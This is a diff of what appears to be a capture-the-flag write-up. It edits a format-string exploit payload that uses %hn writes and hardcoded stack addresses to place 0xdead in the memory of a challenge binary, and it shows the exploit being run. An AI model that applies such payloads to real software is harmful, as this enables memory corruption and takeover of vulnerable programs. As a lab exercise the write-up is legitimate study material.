@@ -61,7 +61,7 @@ First, we'll enter the second nimble's address into the buffer (0xbffffb08 + 2 =
 Second, we'll adjust the 48875 to 48871 (4 more bytes entered).<br>
 Then, at the end we'll make sure that the output string will contain enough bytes, so 0xdead will be written.<br>
 And for last, we again take advantage of the "$" and "hn" options.<br>
-So the input should look like ```\x08\xfb\xff\xbf\x0a\xfb\xff\xbf%48871x%9hn%73662x%10$hn```:
+So the input should look like ```\x08\xfb\xff\xbf\x0a\xfb\xff\xbf%48871x%9hn%8126x%10$hn```:
 ```
 app-systeme-ch14@challenge02:~$ ./ch14 $(python /tmp/exploit.py)
 check at 0xbffffaf8
